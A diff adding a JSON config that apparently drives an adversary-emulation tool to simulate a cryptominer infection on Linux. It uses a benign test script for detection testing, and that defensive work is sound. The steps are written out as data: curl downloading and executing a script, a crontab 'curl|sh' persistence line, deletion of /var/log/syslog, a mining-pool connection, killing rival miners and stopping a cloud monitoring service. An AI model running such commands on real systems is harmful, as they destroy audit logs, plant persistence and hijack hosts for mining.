@@ -1,0 +1,62 @@
+[
+  {
+    "name": "CLEANUP",
+    "remove": [ "/tmp/.../" ]
+  },
+  {
+    "name": "CONNECT-POOL",
+    "fork-and-rename": [ "/tmp/.../miner", "-a ethash", "-o stratum+tcp://xmr.nanopool.org:443", "-u chain-reactor-miner-test" ],
+    "connect": {
+      "method": "socketcall",
+      "protocol": "tcp4",
+      "address": "xmr.nanopool.org",
+      "port": 443
+    }
+  },
+  {
+    "name": "DELETE-LOGS",
+    "execve": [ "rm", "-rf", "/var/log/syslog" ]
+  },
+  {
+    "name": "DOWNLOAD-MINER",
+    "execve": [ "curl", "-L", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh", "-O", "/tmp/a.sh" ],
+    "chmod": {
+      "path": "/tmp/a.sh",
+      "mode": "777"
+    },
+    "execveat": [ "/tmp/a.sh"  ]
+  },
+  {
+    "name": "HIDE-MINER",
+    "execve": [ "mkdir", "-p", "/tmp/..." ],
+    "chmod": {
+      "path": "/tmp/...",
+      "mode": "600"
+    },
+    "copy": [ "/proc/self/exe", "/tmp/.../miner" ],
+    "fchmod": {
+      "path": "/tmp/.../miner",
+      "mode": "0700"
+    }
+  },
+  {
+    "name": "KILL-COMPETITORS",
+    "fork-and-rename": [ "pkill", "-f", "xmrig"  ]
+  },
+  {
+    "name": "PERSIST-CRONTAB",
+    "file-append": {
+        "path": "/etc/crontab",
+        "backup-and-revert": true,
+        "data": "\n* * * * * curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh|sh\n"
+    }
+  },
+  {
+    "name": "RUN-MINER",
+    "execve": [ "/tmp/.../miner", "exit"  ]
+  },
+  {
+    "name": "STOP-SERVICES",
+    "fork-and-rename": [ "systemctl", "stop", "aliyun.service"  ]
+  }
+]
